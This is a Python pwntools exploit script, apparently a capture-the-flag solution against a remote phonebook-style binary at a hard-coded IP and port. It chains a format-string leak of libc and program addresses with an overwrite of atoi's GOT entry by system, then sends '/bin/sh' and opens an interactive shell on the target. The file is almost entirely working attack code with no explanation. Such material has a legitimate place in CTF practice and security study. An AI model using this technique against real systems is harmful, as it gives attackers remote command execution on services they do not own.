'''
Author: 谢嘉伟 wei17306927526@gmail.com
Date: 2024-11-28 17:05:33
LastEditors: 谢嘉伟 wei17306927526@gmail.com
LastEditTime: 2024-11-28 17:05:47
FilePath: /undefined/Users/xiejiawei/codeSecurity/kali/scripts/easypwn.py
Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE
'''

from pwn import *

elf = ELF('./hello')
libc = ELF('libc-2.23.so')
sh = remote('61.147.171.105',58816)

def Add(phone,name,size,info):
    sh.sendlineafter('choice>>','1')
    sh.sendlineafter('number:',phone)
    sh.sendlineafter('name:',name)
    sh.sendlineafter('size:',size)
    sh.sendlineafter('info:',info)

def Edit(index,phone,name,info):
    sh.sendlineafter('choice>>','4')
    sh.sendlineafter('index:',index)
    sh.sendlineafter('number:',phone)
    sh.sendlineafter('name:',name)
    sh.sendlineafter('info:',info)

def Show(index):
    sh.sendlineafter('choice>>','3')
    sh.sendlineafter('index:',index)

# 泄露相关栈地址
Add('%13$p%9$p','aaaaaaaa','15','12345678')
Show('0')
sh.recvuntil('0x')
libc_start_main = int(sh.recv(12),16) - 240
sh.recvuntil('0x')
# 计算基址及所需函数地址
elf_base = int(sh.recv(12),16) - 0x1274
libc_start_main_base = libc_start_main - libc.symbols['__libc_start_main']
system_addr = libc_start_main_base + libc.symbols['system']
atoi_got = elf_base + elf.got['atoi']

# 修改atoi@got为system地址
Edit('0','c'*11,b'd'*13+p64(atoi_got),p64(system_addr))
sh.sendlineafter('>>','/bin/sh')
sh.interactive()
print(sh.recv())